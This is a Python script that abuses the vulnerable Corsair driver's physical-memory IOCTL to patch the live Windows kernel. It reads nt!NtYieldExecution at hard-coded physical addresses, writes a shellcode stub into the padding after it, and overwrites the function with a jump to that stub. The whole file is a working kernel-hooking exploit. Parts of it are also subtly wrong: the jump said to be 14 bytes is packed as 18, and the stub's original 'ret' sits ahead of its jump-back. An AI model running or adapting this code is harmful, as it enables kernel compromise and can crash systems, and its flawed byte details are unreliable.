import ctypes
import struct
import sys

# Data from PHYSICAL HOST debug session (Build 26200)
# Target: nt!NtYieldExecution
HOOK_VA = 0xFFFFF80493D111D0
HOOK_PA = 0x1007111D0
# Signature: 48 83 ec 28 33 c9 e8 15 00 00 00 48 83 c4 28 c3
EXPECTED_SIG = bytes([0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0xE8, 0x15, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3])

# Cave is right after the function (INT3 padding)
CAVE_VA = 0xFFFFF80493D111E0
CAVE_PA = 0x1007111E0
# Cave should be INT3 (0xCC)
CAVE_SIG = bytes([0xCC] * 16)

# Shared Mailbox (we'll use the end of the same page)
MAILBOX_VA = (CAVE_VA & ~0xFFF) + 0xF00
MAILBOX_PA = (CAVE_PA & ~0xFFF) + 0xF00

# Corsair IOCTLs
IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa_base = pa & ~0xFFF
    inp = struct.pack("<QII", pa_base, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def read_phys(h, pa, size):
    v = map_page(h, pa)
    if not v: return None
    offset = pa & 0xFFF
    return bytes((ctypes.c_ubyte * size).from_address(v + offset))

def write_phys(h, pa, data):
    v = map_page(h, pa)
    if not v: return False
    offset = pa & 0xFFF
    dst = (ctypes.c_ubyte * len(data)).from_address(v + offset)
    for i in range(len(data)):
        dst[i] = data[i]
    return True

def main():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver not open")
        return

    # 1. Verify NtYieldExecution Signature
    print(f"[*] Verifying NtYieldExecution signature at PA 0x{HOOK_PA:X}...")
    current_sig = read_phys(h, HOOK_PA, len(EXPECTED_SIG))
    if current_sig != EXPECTED_SIG:
        if current_sig:
            print(f"[-] Signature mismatch! Found: {current_sig.hex(' ')}")
        else:
            print("[-] Failed to read Hook PA.")
        return
    print("[+] Signature MATCHED!")

    # 2. Verify Cave Signature (INT3)
    print(f"[*] Verifying Cave at PA 0x{CAVE_PA:X}...")
    cave_data = read_phys(h, CAVE_PA, len(CAVE_SIG))
    if cave_data != CAVE_SIG:
        print(f"[-] Cave not empty (expected CC)! Found: {cave_data.hex(' ')}")
    else:
        print("[+] Cave is clean INT3 padding.")

    # 3. Construct Stub (Minimal)
    # 0x00: push rax, rcx
    # 0x02: mov rcx, MAILBOX_VA (10 bytes)
    # 0x0C: mov byte ptr [rcx+0x30], 0x77 (4 bytes)
    # 0x10: pop rcx, rax
    # 0x12: original preamble of NtYieldExecution (16 bytes)
    # 0x22: jmp HOOK_VA + 16 (14 bytes)
    
    stub = bytes([
        0x50, 0x51,                                                       # push rax, rcx
        0x48, 0xB9,                                                       # mov rcx, MAILBOX_VA
    ]) + struct.pack("<Q", MAILBOX_VA) + bytes([
        0xC6, 0x41, 0x30, 0x77,                                           # mov byte ptr [rcx+30h], 77h
        0x59, 0x58,                                                       # pop rcx, rax
        # Original Preamble (16 bytes)
        0x48, 0x83, 0xEC, 0x28,                                           # sub rsp, 28h
        0x33, 0xC9,                                                       # xor ecx, ecx
        0xE8, 0x15, 0x00, 0x00, 0x00,                                     # call nt!KeYieldExecution
        0x48, 0x83, 0xC4, 0x28, 0xC3,                                     # add rsp, 28h; ret
        # Jump back
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,                               # jmp qword ptr [rip]
    ]) + struct.pack("<Q", HOOK_VA + 16)

    print("[*] Writing stub to cave...")
    if not write_phys(h, CAVE_PA, stub):
        print("[-] Failed to write stub")
        return

    # 4. Hijack (14 bytes + 2 NOPs to fill the 16-byte function)
    abs_jmp = struct.pack("<HIIQ", 0x25FF, 0, 0, CAVE_VA) + b"\x90\x90"
    
    print("[!] PERFORMING HIJACK ON PHYSICAL HOST...")
    if not write_phys(h, HOOK_PA, abs_jmp):
        print("[-] Hijack failed")
        return

    print("[+] SUCCESS! NtYieldExecution Heartbeat is active.")
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    main()
